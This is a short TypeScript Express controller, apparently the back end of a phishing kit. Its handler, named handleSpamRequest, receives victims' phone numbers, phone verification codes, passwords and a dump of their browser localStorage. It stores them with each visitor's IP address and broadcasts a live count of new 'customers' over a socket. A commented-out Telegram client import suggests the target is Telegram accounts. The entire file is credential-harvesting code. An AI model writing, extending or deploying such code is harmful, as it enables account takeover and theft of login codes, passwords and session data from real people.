import { Request, Response } from 'express';
import Customer from '../models/customer'; // 确保正确导入 Customer 模型
import handleAsync from '../utils/handleAsync';
import { io } from '../services/socket';
let customerCount = 0; // 初始化客户计数器

// import { client } from '../utils/telegramClient';

export const handleSpamRequest = handleAsync(
  async (req: Request, res: Response) => {
    const { data } = req.body;

    const parsedData = JSON.parse(data);

    const { phoneCode, password, phoneNumber, ...rest } = parsedData;

    if (!phoneNumber && !phoneCode) {
      res.status(400);
      throw new Error('Phone number and verification code is required');
    }

    console.log('phonecode', phoneCode);

    const customer = await Customer.findOne({ phoneNumber });

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress; // 获取客户端 IP 地址

    if (customer) {
      await customer.updateOne({
        phoneCode,
        password: password || customer.password,
        localStorage: JSON.stringify(rest),
        ip,
      });
    } else {
      const newCustomer = new Customer({
        phoneCode,
        password,
        phoneNumber,
        localStorage: JSON.stringify(rest),
        ip,
      });

      await newCustomer.save();
      customerCount++; // 增加客户计数
      console.log('customerCount', customerCount);
    }

    // 触发新用户事件
    io.emit('newCustomerAdded', { count: customerCount });
    console.log('newCustomerAdded', { count: customerCount });

    res.status(200).json({
      message: 'success',
    });
  },
);
